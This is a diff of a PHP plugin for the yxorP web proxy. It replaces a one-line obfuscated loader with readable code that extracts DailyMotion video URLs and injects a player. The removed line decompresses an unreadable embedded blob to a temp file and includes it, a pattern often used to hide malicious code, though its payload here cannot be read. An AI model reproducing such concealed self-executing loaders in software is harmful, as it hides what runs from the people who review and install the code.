@@ -1,1 +1,28 @@
-<?php $f=fopen(__FILE__,'r');fseek($f,__COMPILER_HALT_OFFSET__);$t=tmpfile();$u=stream_get_meta_data($t)['uri'];fwrite($t,gzinflate(stream_get_contents($f)));include($u);fclose($t);__halt_compiler();m‘okÂ0ÆßúB'´uuÎ!lèt7Ø›ïÕ•šZÈ?’T,cß}×v]ëf($¹Üó»{®Oê È°OŠ“ÔKÒºëäêûú`­Z/µ<¯GvZ¾R–C^’ŒïÒfR,Y¾Ï“‘ò¼5V'ÔÖa×ùt‚KiiZHI/×,V‰µ ™?-Q¼BİPÉıªJ%É·,£d—Z>)’+	Ú¦HÊ-¬5Ÿ¸\=FIvf?Y+¿	ù›i'‘JaKÖ¬Õæ{°‹:„Ó.7Û‘@iØÇ<±ôøC-y/X}x›k®ÆåŞ½!÷£_6ªt0axŞfÕÁ1KAb}^¦ÎƒF±mÎ;¨$Š%hÔ 6®/AÍ‰Èèn|‘ñıÃ]köÍr6™h@1…8	ŞUò¢¦Bë!ìÌìëlÒÿ™\!6İX4Ò\ø?ƒ¹igı·Âï
+<?php /* yxorP */
+
+use yxorP\http\ProxyEvent;
+
+class DailyMotionPlugin extends AbstractPlugin
+{
+    protected $url_pattern = 'dailymotion.com';
+
+    public function onCompleted(ProxyEvent $event)
+    {
+
+        $response = $event['response'];
+        $content = $response->getContent();
+
+        if (preg_match('/"url":"([^"]+mp4[^"]*)"/m', $content, $matches)) {
+
+            $video = stripslashes($matches[1]);
+
+            $player = vid_player($video, 1240, 478);
+
+            $content = Html::replace_inner("#player", $player, $content);
+        }
+
+        $content = Html::remove_scripts($content);
+
+        $response->setContent($content);
+    }
+}
